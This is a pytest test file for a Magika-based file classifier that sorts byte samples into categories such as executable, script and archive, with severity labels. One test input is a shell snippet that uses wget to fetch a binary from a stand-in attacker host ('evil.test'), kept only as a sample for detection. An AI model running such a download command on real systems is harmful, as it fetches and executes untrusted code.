import os

import pytest

from common import file_classifier
from tests.api_mocks import data_path


@pytest.mark.parametrize("data, category, label", [
    (b"\x7fELF\x02\x01\x01" + b"\x00" * 64, "executable", "elf"),
    (b"#!/bin/sh\nwget http://evil.test/x86\n", "script", "shell"),
    (b"<!DOCTYPE html><html></html>", "html", "html"),
    (b'{"a": 1}', "json", "json"),
    (b"PK\x03\x04rest-of-zip", "archive", "zip"),
    (b"", "empty", "empty"),
])
def test_classify_bytes_maps_magika_label_to_category(data, category, label):
    result = file_classifier.classify_bytes(data)
    assert (result["category"], result["label"]) == (category, label)


def test_classify_returns_none_when_magika_is_unavailable(monkeypatch):
    monkeypatch.setattr(file_classifier, "_magika", None)
    monkeypatch.setattr(file_classifier, "_magika_failed", True)
    assert file_classifier.classify_bytes(b"#!/bin/sh\n") is None
    assert file_classifier.is_available() is False


def test_category_info_falls_back_for_unknown_category():
    assert file_classifier.category_info("script") == {"label": "Script", "severity": "high"}
    assert file_classifier.category_info(None) == {"label": "Not classified", "severity": "low"}


@pytest.mark.slow
@pytest.mark.parametrize("path, category", [
    (data_path("samples", "dropper.sh"), "script"),
    (data_path("samples", "not_found.html"), "html"),
    (data_path("samples", "payload.json"), "json"),
    ("/bin/true", "executable"),  # real ELF binary of the test host
])
def test_real_magika_classifies_samples(real_magika, path, category):
    if not os.path.exists(path):
        pytest.skip(f"{path} not available")
    assert file_classifier.classify_path(path)["category"] == category
